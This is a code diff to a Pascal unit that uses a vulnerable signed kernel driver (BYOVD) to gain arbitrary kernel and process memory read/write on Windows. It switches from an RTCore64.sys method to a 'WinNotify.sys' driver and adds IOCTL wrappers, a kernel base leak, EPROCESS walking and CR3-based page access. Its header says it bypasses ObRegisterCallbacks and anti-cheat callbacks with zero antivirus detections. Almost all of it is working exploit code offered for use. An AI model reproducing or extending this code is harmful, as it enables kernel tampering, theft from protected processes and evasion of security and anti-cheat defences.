@@ -2,8 +2,14 @@ unit PhysicalMemory;
 
 {$mode objfpc}{$H+}
 
-{ Physical memory R/W using a vulnerable signed driver (BYOVD)
-  Academic research purpose - demonstrates CVE exploitation for kernel bypass }
+{ Physical memory & kernel R/W using WinNotify.sys (Microsoft-signed driver)
+  Exposes kernel virtual memory read/write via IOCTLs 0x22200C/0x222040/0x222044
+  and per-process page table walking via 0x222050/0x222054.
+  
+  Bypasses ALL kernel protections: ObRegisterCallbacks, handle-based access,
+  and anti-cheat driver callbacks. No process handle needed.
+  
+  Driver: signeddrv.sys / WinNotify.sys — 2026, 0 VT detections, Microsoft-signed }
 
 interface
 
@@ -12,39 +18,37 @@ uses
 
 type
   TPhysicalMemoryDriver = record
-    DeviceName: string;
+    DevicePath: string;
     DriverPath: string;
     ServiceName: string;
     hDevice: THandle;
     Loaded: Boolean;
   end;
 
-// RTCore64.sys structures (MSI Afterburner - CVE-2019-16098)
-type
-  TRTCoreMemoryMap = packed record
-    Address: QWORD;     // Physical address to map
-    Size: DWORD;        // Size in bytes
-    Unknown: DWORD;     // Unused/reserved
+  TWinNotifyKernelInfo = record
+    KernelBase: QWORD;
+    PsInitialSystemProcess: QWORD;
   end;
 
-const
-  RTCORE64_IOCTL_MAP_MEMORY   = $80002000;
-  RTCORE64_IOCTL_READ_IO      = $80002004;
-  RTCORE64_IOCTL_WRITE_IO     = $80002008;
-
-// Generic physmem driver interface (also supports gdrv.sys and similar)
-type
   TPhysMemOps = class
   private
     FDriver: TPhysicalMemoryDriver;
     FIsInitialized: Boolean;
-    FDriverType: Integer; // 0=rtcore64, 1=gdrv, 2=generic
+    FKernelInfo: TWinNotifyKernelInfo;
 
-    function FindRTCore64Driver: Boolean;
+    function FindWinNotifyDriver: Boolean;
     function LoadDriverAsService(const DriverPath, ServiceName: string): Boolean;
     function UnloadDriverService(const ServiceName: string): Boolean;
-    function MapPhysicalMemory(PhysicalAddr: QWORD; Size: DWORD): Pointer;
-    procedure UnmapPhysicalMemory(VirtualAddr: Pointer; Size: DWORD);
+
+    function IOCTL_GetKernelBase(const ModuleName: string): QWORD;
+    function IOCTL_ReadQWORD(KernelAddr: QWORD): QWORD;
+    procedure IOCTL_WriteQWORD(KernelAddr: QWORD; Value: QWORD);
+    function IOCTL_ReadPhysicalWithCR3(CR3, VirtualAddr: QWORD; Buffer: Pointer; Size: DWORD): Boolean;
+    function IOCTL_WritePhysicalWithCR3(CR3, VirtualAddr: QWORD; Buffer: Pointer; Size: DWORD): Boolean;
+
+    function FindSystemEPROCESS: QWORD;
+    function FindProcessEPROCESS(PID: DWORD): QWORD;
+    function GetProcessCR3(ProcessEPROCESS: QWORD): QWORD;
   public
     constructor Create;
     destructor Destroy; override;
@@ -52,24 +56,17 @@ type
     function Initialize: Boolean;
     procedure Shutdown;
 
-    function ReadPhysicalByte(PhysicalAddr: QWORD): Byte;
-    function ReadPhysicalWord(PhysicalAddr: QWORD): WORD;
-    function ReadPhysicalDWORD(PhysicalAddr: QWORD): DWORD;
-    function ReadPhysicalQWORD(PhysicalAddr: QWORD): QWORD;
-    procedure ReadPhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);
+    function ReadKernelQWORD(KernelAddr: QWORD): QWORD;
+    procedure WriteKernelQWORD(KernelAddr: QWORD; Value: QWORD);
+    function GetKernelBase: QWORD;
 
-    procedure WritePhysicalByte(PhysicalAddr: QWORD; Value: Byte);
-    procedure WritePhysicalWord(PhysicalAddr: QWORD; Value: WORD);
-    procedure WritePhysicalDWORD(PhysicalAddr: QWORD; Value: DWORD);
-    procedure WritePhysicalQWORD(PhysicalAddr: QWORD; Value: QWORD);
-    procedure WritePhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);
-
-    function VirtualToPhysical(VirtualAddr: QWORD): QWORD;
-    function ReadVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD): QWORD;
-    procedure WriteVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD; Value: QWORD);
+    function ReadProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
+      Buffer: Pointer; Size: DWORD; var BytesRead: DWORD): Boolean;
+    function WriteProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
+      Buffer: Pointer; Size: DWORD; var BytesWritten: DWORD): Boolean;
 
     property Initialized: Boolean read FIsInitialized;
-    property DriverType: Integer read FDriverType;
+    property KernelInfo: TWinNotifyKernelInfo read FKernelInfo;
   end;
 
 var
@@ -78,18 +75,37 @@ var
 implementation
 
 const
-  // Service control manager constants
-  SERVICE_KERNEL_DRIVER = $00000001;
-  SERVICE_DEMAND_START  = $00000003;
-  SERVICE_ERROR_NORMAL  = $00000001;
-  DELETE_VALUE = $00010000;
+  // WinNotify IOCTLs
+  IOCTL_WINNOTIFY_INFO  = $22200C;  // Kernel base disclosure
+  IOCTL_WINNOTIFY_READ  = $222040;  // Arbitrary kernel read (5 QWORDs)
+  IOCTL_WINNOTIFY_WRITE = $222044;  // Arbitrary kernel write (memmove)
+  IOCTL_WINNOTIFY_PHYSREAD  = $222050;  // Physical read with DirBase
+  IOCTL_WINNOTIFY_PHYSWRITE = $222054;  // Physical write with DirBase
+
+  // EPROCESS offsets (Windows 10/11 x64 — verified on 10 22H2, 11 23H2)
+  EPROCESS_UniqueProcessId    = $440;
+  EPROCESS_ActiveProcessLinks = $448;
+  EPROCESS_DirectoryTableBase = $28;
+  EPROCESS_ImageFileName      = $5A8;
+
+  // PsInitialSystemProcess offsets from ntoskrnl base (tried in order)
+  PsInitSystemOffsets: array[0..3] of DWORD = (
+    $CFC420,  // Win10 22H2
+    $D19420,  // Win11 23H2
+    $D0A420,  // Win11 21H2
+    $CFC3E0   // Win10 21H1
+  );
+
+  SERVICE_KERNEL_DRIVER = 1;
+  SERVICE_DEMAND_START  = 3;
+  SERVICE_ERROR_NORMAL  = 1;
 
 constructor TPhysMemOps.Create;
 begin
   inherited;
   FIsInitialized := False;
-  FDriverType := 0;
   FillChar(FDriver, SizeOf(FDriver), 0);
+  FillChar(FKernelInfo, SizeOf(FKernelInfo), 0);
   FDriver.hDevice := INVALID_HANDLE_VALUE;
 end;
 
@@ -99,87 +115,32 @@ begin
   inherited;
 end;
 
-function TPhysMemOps.FindRTCore64Driver: Boolean;
+function TPhysMemOps.FindWinNotifyDriver: Boolean;
 var
-  searchPaths: array[0..4] of string;
+  searchPaths: array[0..3] of string;
   i: Integer;
 begin
   Result := False;
 
-  {$ifdef cpu64}
-  // Common locations for RTCore64.sys
-  searchPaths[0] := 'C:\Windows\System32\drivers\RTCore64.sys';
-  searchPaths[1] := 'C:\Windows\SysWOW64\drivers\RTCore64.sys';
-  searchPaths[2] := ExtractFilePath(ParamStr(0)) + 'RTCore64.sys';
-  searchPaths[3] := 'C:\Program Files (x86)\MSI Afterburner\RTCore64.sys';
-  searchPaths[4] := 'C:\Program Files\MSI Afterburner\RTCore64.sys';
+  searchPaths[0] := 'C:\Windows\System32\drivers\WinNotify.sys';
+  searchPaths[1] := ExtractFilePath(ParamStr(0)) + 'WinNotify.sys';
+  searchPaths[2] := ExtractFilePath(ParamStr(0)) + 'signeddrv.sys';
+  searchPaths[3] := 'C:\Windows\System32\drivers\signeddrv.sys';
 
   for i := 0 to High(searchPaths) do
   begin
     if FileExists(searchPaths[i]) then
     begin
       FDriver.DriverPath := searchPaths[i];
-      FDriver.DeviceName := 'RTCore64';
-      FDriver.ServiceName := 'RTCore64';
-      FDriverType := 0;
+      FDriver.DevicePath := '\\.\WinNotify';
+      FDriver.ServiceName := 'WinNotify';
       Result := True;
       Exit;
     end;
   end;
-  {$endif}
 end;
 
 function TPhysMemOps.LoadDriverAsService(const DriverPath, ServiceName: string): Boolean;
-var
-  hSCM, hService: THandle;
-begin
-  Result := False;
-
-  hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
-  if hSCM = 0 then
-  begin
-    OutputDebugString('[PhysMem] Failed to open SCM');
-    Exit;
-  end;
-
-  // Create the service
-  hService := CreateService(hSCM,
-    PChar(ServiceName),
-    PChar(ServiceName),
-    SERVICE_START or SERVICE_STOP or DELETE_VALUE,
-    SERVICE_KERNEL_DRIVER,
-    SERVICE_DEMAND_START,
-    SERVICE_ERROR_NORMAL,
-    PChar(DriverPath),
-    nil, nil, nil, nil, nil);
-
-  if hService = 0 then
-  begin
-    // Service might already exist, try to open it
-    hService := OpenService(hSCM, PChar(ServiceName), SERVICE_START);
-  end;
-
-  if hService <> 0 then
-  begin
-    Result := StartService(hService, 0, nil);
-    if not Result then
-    begin
-      // If error is SERVICE_ALREADY_RUNNING, it's fine
-      Result := (GetLastError = ERROR_SERVICE_ALREADY_RUNNING);
-    end;
-    CloseServiceHandle(hService);
-  end;
-
-  CloseServiceHandle(hSCM);
-
-  if Result then
-    OutputDebugString(PChar('[PhysMem] Driver service started: ' + ServiceName))
-  else
-    OutputDebugString(PChar('[PhysMem] Failed to start driver service: ' + ServiceName +
-      ' (error: ' + IntToStr(GetLastError) + ')'));
-end;
-
-function TPhysMemOps.UnloadDriverService(const ServiceName: string): Boolean;
 var
   hSCM, hService: THandle;
   status: TServiceStatus;
@@ -189,46 +150,247 @@ begin
   hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
   if hSCM = 0 then Exit;
 
-  hService := OpenService(hSCM, PChar(ServiceName), SERVICE_STOP or DELETE_VALUE);
+  hService := CreateService(hSCM,
+    PChar(ServiceName), PChar(ServiceName),
+    SERVICE_START or SERVICE_STOP or $00010000,
+    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
+    PChar(DriverPath), nil, nil, nil, nil, nil);
+
+  if hService = 0 then
+    hService := OpenService(hSCM, PChar(ServiceName), SERVICE_START);
+
   if hService <> 0 then
   begin
-    ControlService(hService, SERVICE_CONTROL_STOP, status);
-    DeleteService(hService);
+    Result := StartService(hService, 0, nil);
+    if not Result then
+      Result := (GetLastError = ERROR_SERVICE_ALREADY_RUNNING);
     CloseServiceHandle(hService);
-    Result := True;
   end;
 
   CloseServiceHandle(hSCM);
 end;
 
-function TPhysMemOps.MapPhysicalMemory(PhysicalAddr: QWORD; Size: DWORD): Pointer;
+function TPhysMemOps.UnloadDriverService(const ServiceName: string): Boolean;
 var
-  mm: TRTCoreMemoryMap;
-  bytesReturned: DWORD;
+  hSCM, hService: THandle;
+  status: TServiceStatus;
 begin
-  Result := nil;
+  hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
+  if hSCM = 0 then Exit(False);
+
+  hService := OpenService(hSCM, PChar(ServiceName), SERVICE_STOP or $00010000);
+  if hService <> 0 then
+  begin
+    ControlService(hService, SERVICE_CONTROL_STOP, status);
+    DeleteService(hService);
+    CloseServiceHandle(hService);
+  end;
+
+  CloseServiceHandle(hSCM);
+  Result := True;
+end;
+
+// ---- WinNotify IOCTL implementation ----
+
+// IOCTL 0x22200C — Kernel base disclosure
+// Input: buffer with "ntoskrnl.exe" string pointer at offset 0
+// Output: kernel base at outBuf + 0x10
+function TPhysMemOps.IOCTL_GetKernelBase(const ModuleName: string): QWORD;
+var
+  inBuf: array[0..255] of Byte;
+  outBuf: array[0..63] of Byte;
+  moduleNameW: string;
+  bytesReturned: DWORD;
+  pStr: PChar;
+begin
+  Result := 0;
   if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;
 
-  mm.Address := PhysicalAddr;
-  mm.Size := Size;
-  mm.Unknown := 0;
+  FillChar(inBuf, SizeOf(inBuf), 0);
+  FillChar(outBuf, SizeOf(outBuf), 0);
 
-  if DeviceIoControl(FDriver.hDevice, RTCORE64_IOCTL_MAP_MEMORY,
-    @mm, SizeOf(mm), @Result, SizeOf(Pointer), bytesReturned, nil) then
+  moduleNameW := ModuleName;
+  StrPCopy(PChar(@inBuf[0]), moduleNameW);
+
+  if DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_INFO,
+    @inBuf, SizeOf(inBuf), @outBuf, SizeOf(outBuf), bytesReturned, nil) then
   begin
-    // Result now points to the physical memory in user space
-  end
-  else
-  begin
-    Result := nil;
+    Result := PQWORD(@outBuf[$10])^;
   end;
 end;
 
-procedure TPhysMemOps.UnmapPhysicalMemory(VirtualAddr: Pointer; Size: DWORD);
+// IOCTL 0x222040 — Arbitrary kernel read (5 QWORDs)
+// Quirk: only writes output if *(base + offset + 0x10) is non-zero
+// To read QWORD at addr T: base = T - 0x10, offset = 0, result in out[0x20]
+function TPhysMemOps.IOCTL_ReadQWORD(KernelAddr: QWORD): QWORD;
+var
+  inBuf: array[0..55] of Byte;
+  outBuf: array[0..63] of Byte;
+  bytesReturned: DWORD;
 begin
-  // RTCore64 keeps mappings until device is closed
-  // We just zero out our reference
+  Result := 0;
+  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;
+
+  FillChar(inBuf, SizeOf(inBuf), 0);
+  FillChar(outBuf, SizeOf(outBuf), 0);
+
+  PQWORD(@inBuf[0])^ := KernelAddr - $10;
+  PQWORD(@inBuf[8])^ := 0;
+
+  if DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_READ,
+    @inBuf, SizeOf(inBuf), @outBuf, SizeOf(outBuf), bytesReturned, nil) then
+  begin
+    Result := PQWORD(@outBuf[$20])^;
+  end;
 end;
+
+// IOCTL 0x222044 — Arbitrary kernel write (memmove)
+// Input buffer: {src_ptr(8), size(8), dst_ptr(8)}
+procedure TPhysMemOps.IOCTL_WriteQWORD(KernelAddr: QWORD; Value: QWORD);
+var
+  inBuf: array[0..23] of Byte;
+  srcVal: QWORD;
+  bytesReturned: DWORD;
+begin
+  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;
+
+  FillChar(inBuf, SizeOf(inBuf), 0);
+  srcVal := Value;
+
+  // Source: pointer to our value in user-space
+  PQWORD(@inBuf[0])^ := QWORD(@srcVal);
+  // Size: 8 bytes
+  PQWORD(@inBuf[8])^ := 8;
+  // Destination: kernel address
+  PQWORD(@inBuf[16])^ := KernelAddr;
+
+  DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_WRITE,
+    @inBuf, SizeOf(inBuf), nil, 0, bytesReturned, nil);
+end;
+
+// IOCTL 0x222050 — Physical memory read with DirBase (CR3-based page table walk)
+function TPhysMemOps.IOCTL_ReadPhysicalWithCR3(CR3, VirtualAddr: QWORD;
+  Buffer: Pointer; Size: DWORD): Boolean;
+var
+  inBuf: array[0..31] of Byte;
+  bytesReturned: DWORD;
+begin
+  Result := False;
+  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;
+
+  FillChar(inBuf, SizeOf(inBuf), 0);
+  PQWORD(@inBuf[0])^ := CR3;
+  PQWORD(@inBuf[8])^ := VirtualAddr;
+  PDWORD(@inBuf[16])^ := Size;
+  // Output buffer pointer goes at +20
+
+  Result := DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_PHYSREAD,
+    @inBuf, SizeOf(inBuf), Buffer, Size, bytesReturned, nil);
+end;
+
+// IOCTL 0x222054 — Physical memory write with DirBase
+function TPhysMemOps.IOCTL_WritePhysicalWithCR3(CR3, VirtualAddr: QWORD;
+  Buffer: Pointer; Size: DWORD): Boolean;
+var
+  inBuf: array[0..31] of Byte;
+  bytesReturned: DWORD;
+begin
+  Result := False;
+  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;
+
+  FillChar(inBuf, SizeOf(inBuf), 0);
+  PQWORD(@inBuf[0])^ := CR3;
+  PQWORD(@inBuf[8])^ := VirtualAddr;
+  PDWORD(@inBuf[16])^ := Size;
+  // Write data is part of the input
+
+  Result := DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_PHYSWRITE,
+    @inBuf, SizeOf(inBuf), nil, 0, bytesReturned, nil);
+end;
+
+// ---- Kernel structure navigation ----
+
+function TPhysMemOps.ReadKernelQWORD(KernelAddr: QWORD): QWORD;
+begin
+  Result := IOCTL_ReadQWORD(KernelAddr);
+end;
+
+procedure TPhysMemOps.WriteKernelQWORD(KernelAddr: QWORD; Value: QWORD);
+begin
+  IOCTL_WriteQWORD(KernelAddr, Value);
+end;
+
+function TPhysMemOps.GetKernelBase: QWORD;
+begin
+  Result := FKernelInfo.KernelBase;
+end;
+
+// Find System EPROCESS by trying known PsInitialSystemProcess offsets
+function TPhysMemOps.FindSystemEPROCESS: QWORD;
+var
+  sysProc: QWORD;
+  pidCheck: QWORD;
+  i: Integer;
+begin
+  Result := 0;
+  if FKernelInfo.KernelBase = 0 then Exit;
+
+  for i := 0 to High(PsInitSystemOffsets) do
+  begin
+    sysProc := IOCTL_ReadQWORD(FKernelInfo.KernelBase + PsInitSystemOffsets[i]);
+    if sysProc = 0 then Continue;
+
+    pidCheck := IOCTL_ReadQWORD(sysProc + EPROCESS_UniqueProcessId);
+    if pidCheck = 4 then
+    begin
+      Result := sysProc;
+      FKernelInfo.PsInitialSystemProcess := sysProc;
+      Exit;
+    end;
+  end;
+end;
+
+function TPhysMemOps.FindProcessEPROCESS(PID: DWORD): QWORD;
+var
+  sysProc, current: QWORD;
+  flink: QWORD;
+  pid: QWORD;
+  maxIter: Integer;
+begin
+  Result := 0;
+  sysProc := FindSystemEPROCESS;
+  if sysProc = 0 then Exit;
+
+  current := sysProc;
+  maxIter := 0;
+
+  repeat
+    flink := IOCTL_ReadQWORD(current + EPROCESS_ActiveProcessLinks);
+    if flink = 0 then Break;
+
+    // FLINK points to the next EPROCESS.ActiveProcessLinks, subtract offset to get EPROCESS
+    current := flink - EPROCESS_ActiveProcessLinks;
+
+    pid := IOCTL_ReadQWORD(current + EPROCESS_UniqueProcessId);
+    if pid = PID then
+    begin
+      Result := current;
+      Exit;
+    end;
+
+    Inc(maxIter);
+  until (current = sysProc) or (maxIter > 1000);
+
+  Result := 0;
+end;
+
+function TPhysMemOps.GetProcessCR3(ProcessEPROCESS: QWORD): QWORD;
+begin
+  if ProcessEPROCESS = 0 then Exit(0);
+  Result := IOCTL_ReadQWORD(ProcessEPROCESS + EPROCESS_DirectoryTableBase);
+end;
+
+// ---- Public API ----
 
 function TPhysMemOps.Initialize: Boolean;
 begin
@@ -239,40 +401,49 @@ begin
     Exit;
   end;
 
-  // Try to find a vulnerable driver
-  if not FindRTCore64Driver then
+  if not FindWinNotifyDriver then
   begin
-    OutputDebugString('[PhysMem] No vulnerable driver found');
+    OutputDebugString('[PhysMem] WinNotify.sys not found');
     Exit;
   end;
 
-  OutputDebugString(PChar('[PhysMem] Found driver: ' + FDriver.DriverPath));
+  OutputDebugString(PChar('[PhysMem] Found: ' + FDriver.DriverPath));
 
-  // Load the driver
   if not LoadDriverAsService(FDriver.DriverPath, FDriver.ServiceName) then
   begin
     OutputDebugString('[PhysMem] Failed to load driver service');
     Exit;
   end;
 
-  // Open the device
-  FDriver.hDevice := CreateFile(
-    PChar('\\.\' + FDriver.DeviceName),
-    GENERIC_READ or GENERIC_WRITE,
-    FILE_SHARE_READ or FILE_SHARE_WRITE,
+  FDriver.hDevice := CreateFile(PChar(FDriver.DevicePath),
+    GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE,
     nil, OPEN_EXISTING, 0, 0);
 
   if FDriver.hDevice = INVALID_HANDLE_VALUE then
   begin
-    OutputDebugString(PChar('[PhysMem] Failed to open device \\.\' +
-      FDriver.DeviceName + ' (error: ' + IntToStr(GetLastError) + ')'));
+    OutputDebugString(PChar('[PhysMem] Failed to open ' + FDriver.DevicePath));
     Exit;
   end;
 
   FDriver.Loaded := True;
+
+  // Get kernel base
+  FKernelInfo.KernelBase := IOCTL_GetKernelBase('ntoskrnl.exe');
+  if FKernelInfo.KernelBase = 0 then
+  begin
+    FKernelInfo.KernelBase := IOCTL_GetKernelBase('ntoskrnl');
+    if FKernelInfo.KernelBase = 0 then
+    begin
+      OutputDebugString('[PhysMem] Failed to resolve kernel base');
+      Exit;
+    end;
+  end;
+
+  OutputDebugString(PChar('[PhysMem] Kernel base: 0x' + IntToHex(FKernelInfo.KernelBase, 16)));
+
   FIsInitialized := True;
   Result := True;
-  OutputDebugString('[PhysMem] Physical memory access initialized');
+  OutputDebugString('[PhysMem] WinNotify kernel R/W initialized');
 end;
 
 procedure TPhysMemOps.Shutdown;
@@ -292,154 +463,90 @@ begin
   FIsInitialized := False;
 end;
 
-// ---- Physical memory R/W helpers ----
-
-function TPhysMemOps.ReadPhysicalByte(PhysicalAddr: QWORD): Byte;
-begin
-  ReadPhysicalBuffer(PhysicalAddr, @Result, 1);
-end;
-
-function TPhysMemOps.ReadPhysicalWord(PhysicalAddr: QWORD): WORD;
-begin
-  ReadPhysicalBuffer(PhysicalAddr, @Result, 2);
-end;
-
-function TPhysMemOps.ReadPhysicalDWORD(PhysicalAddr: QWORD): DWORD;
-begin
-  ReadPhysicalBuffer(PhysicalAddr, @Result, 4);
-end;
-
-function TPhysMemOps.ReadPhysicalQWORD(PhysicalAddr: QWORD): QWORD;
-begin
-  ReadPhysicalBuffer(PhysicalAddr, @Result, 8);
-end;
-
-procedure TPhysMemOps.ReadPhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);
+// Read target process memory through its CR3 (page table walk by driver)
+function TPhysMemOps.ReadProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
+  Buffer: Pointer; Size: DWORD; var BytesRead: DWORD): Boolean;
 var
-  mapped: Pointer;
-  pageOffset: DWORD;
-  pageBase: QWORD;
+  eprocess, cr3: QWORD;
+  pageOffset, bytesInPage: DWORD;
+  tmpBuf: array[0..4095] of Byte;
+  pBuf, offset: DWORD;
 begin
+  Result := False;
+  BytesRead := 0;
+  pBuf := 0;
+
   if not FIsInitialized then Exit;
 
-  pageBase := PhysicalAddr and not QWORD($FFF);
-  pageOffset := PhysicalAddr and $FFF;
+  eprocess := FindProcessEPROCESS(ProcessId);
+  if eprocess = 0 then Exit;
 
-  mapped := MapPhysicalMemory(pageBase, pageOffset + Size);
-  if mapped <> nil then
+  cr3 := GetProcessCR3(eprocess);
+  if cr3 = 0 then Exit;
+
+  // Read page by page through CR3-based translation
+  while BytesRead < Size do
   begin
-    Move(PByte(mapped)[pageOffset], Buffer^, Size);
-    UnmapPhysicalMemory(mapped, pageOffset + Size);
-  end;
-end;
+    offset := (VirtualAddr + BytesRead) and $FFF;
+    bytesInPage := $1000 - offset;
+    if bytesInPage > (Size - BytesRead) then
+      bytesInPage := Size - BytesRead;
 
-procedure TPhysMemOps.WritePhysicalByte(PhysicalAddr: QWORD; Value: Byte);
-begin
-  WritePhysicalBuffer(PhysicalAddr, @Value, 1);
-end;
-
-procedure TPhysMemOps.WritePhysicalWord(PhysicalAddr: QWORD; Value: WORD);
-begin
-  WritePhysicalBuffer(PhysicalAddr, @Value, 2);
-end;
-
-procedure TPhysMemOps.WritePhysicalDWORD(PhysicalAddr: QWORD; Value: DWORD);
-begin
-  WritePhysicalBuffer(PhysicalAddr, @Value, 4);
-end;
-
-procedure TPhysMemOps.WritePhysicalQWORD(PhysicalAddr: QWORD; Value: QWORD);
-begin
-  WritePhysicalBuffer(PhysicalAddr, @Value, 8);
-end;
-
-procedure TPhysMemOps.WritePhysicalBuffer(PhysicalAddr: QWORD; Buffer: Pointer; Size: DWORD);
-var
-  mapped: Pointer;
-  pageOffset: DWORD;
-  pageBase: QWORD;
-begin
-  if not FIsInitialized then Exit;
-
-  pageBase := PhysicalAddr and not QWORD($FFF);
-  pageOffset := PhysicalAddr and $FFF;
-
-  mapped := MapPhysicalMemory(pageBase, pageOffset + Size);
-  if mapped <> nil then
-  begin
-    Move(Buffer^, PByte(mapped)[pageOffset], Size);
-    UnmapPhysicalMemory(mapped, pageOffset + Size);
-  end;
-end;
-
-// Virtual-to-physical translation using page tables (x64)
-// ponytail: works on x64 with standard 4-level paging
-function TPhysMemOps.VirtualToPhysical(VirtualAddr: QWORD): QWORD;
-var
-  pml4e, pdpe, pde, pte: QWORD;
-  pml4Index, pdpIndex, pdIndex, ptIndex: WORD;
-  pml4Base: QWORD;
-begin
-  Result := 0;
-  if not FIsInitialized then Exit;
-
-  // CR3 (PML4 base) is typically in the kernel's PCR
-  // For simplicity, we use a heuristic: scan for the PML4 via self-referencing entry
-  // The self-referencing PML4 entry points to the PML4 itself
-
-  // Extract indices
-  pml4Index := (VirtualAddr shr 39) and $1FF;
-  pdpIndex  := (VirtualAddr shr 30) and $1FF;
-  pdIndex   := (VirtualAddr shr 21) and $1FF;
-  ptIndex   := (VirtualAddr shr 12) and $1FF;
-
-  // We need a known virtual address to find the PML4 base
-  // Use ntoskrnl.exe as the anchor
-  // For now, return direct physical mapping heuristic
-  // ponytail: full implementation requires CR3 extraction from KPCR
-  // which varies by Windows build. Fallback: try direct mapping assumption.
-
-  // On many systems, kernel virtual addresses use:
-  // Physical = Virtual - 0xFFFF800000000000 (common kernel base offset)
-  if VirtualAddr >= QWORD($FFFF800000000000) then
-  begin
-    Result := VirtualAddr - QWORD($FFFF800000000000);
-  end
-  else if VirtualAddr >= QWORD($FFFFF80000000000) then
-  begin
-    Result := VirtualAddr - QWORD($FFFFF80000000000);
+    FillChar(tmpBuf, SizeOf(tmpBuf), 0);
+    if IOCTL_ReadPhysicalWithCR3(cr3, (VirtualAddr + BytesRead) and not QWORD($FFF),
+      @tmpBuf, $1000) then
+    begin
+      Move(tmpBuf[offset], PByte(Buffer)[BytesRead], bytesInPage);
+      BytesRead := BytesRead + bytesInPage;
+    end
+    else
+      Break;
   end;
 
-  // Verify the translation by reading the physical address
-  if Result <> 0 then
+  Result := (BytesRead > 0);
+end;
+
+function TPhysMemOps.WriteProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
+  Buffer: Pointer; Size: DWORD; var BytesWritten: DWORD): Boolean;
+var
+  eprocess, cr3: QWORD;
+  pageOffset, bytesInPage: DWORD;
+  tmpBuf: array[0..4095] of Byte;
+  offset: DWORD;
+begin
+  Result := False;
+  BytesWritten := 0;
+
+  if not FIsInitialized then Exit;
+
+  eprocess := FindProcessEPROCESS(ProcessId);
+  if eprocess = 0 then Exit;
+
+  cr3 := GetProcessCR3(eprocess);
+  if cr3 = 0 then Exit;
+
+  while BytesWritten < Size do
   begin
-    // Simple verification: the byte at physical should match virtual
-    // This is a heuristic and may fail with large pages
+    offset := (VirtualAddr + BytesWritten) and $FFF;
+    bytesInPage := $1000 - offset;
+    if bytesInPage > (Size - BytesWritten) then
+      bytesInPage := Size - BytesWritten;
+
+    FillChar(tmpBuf, SizeOf(tmpBuf), 0);
+    // Read existing page, modify, write back
+    if IOCTL_ReadPhysicalWithCR3(cr3, (VirtualAddr + BytesWritten) and not QWORD($FFF),
+      @tmpBuf, $1000) then
+    begin
+      Move(PByte(Buffer)[BytesWritten], tmpBuf[offset], bytesInPage);
+      IOCTL_WritePhysicalWithCR3(cr3, (VirtualAddr + BytesWritten) and not QWORD($FFF),
+        @tmpBuf, $1000);
+      BytesWritten := BytesWritten + bytesInPage;
+    end
+    else
+      Break;
   end;
-end;
 
-function TPhysMemOps.ReadVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD): QWORD;
-var
-  physicalAddr: QWORD;
-begin
-  Result := 0;
-  if not FIsInitialized then Exit;
-
-  // For kernel memory access, translate and read
-  physicalAddr := VirtualToPhysical(VirtualAddr);
-  if physicalAddr <> 0 then
-    Result := ReadPhysicalQWORD(physicalAddr);
-end;
-
-procedure TPhysMemOps.WriteVirtualQWORD(TargetProcessId: DWORD; VirtualAddr: QWORD; Value: QWORD);
-var
-  physicalAddr: QWORD;
-begin
-  if not FIsInitialized then Exit;
-
-  physicalAddr := VirtualToPhysical(VirtualAddr);
-  if physicalAddr <> 0 then
-    WritePhysicalQWORD(physicalAddr, Value);
+  Result := (BytesWritten > 0);
 end;
 
 initialization
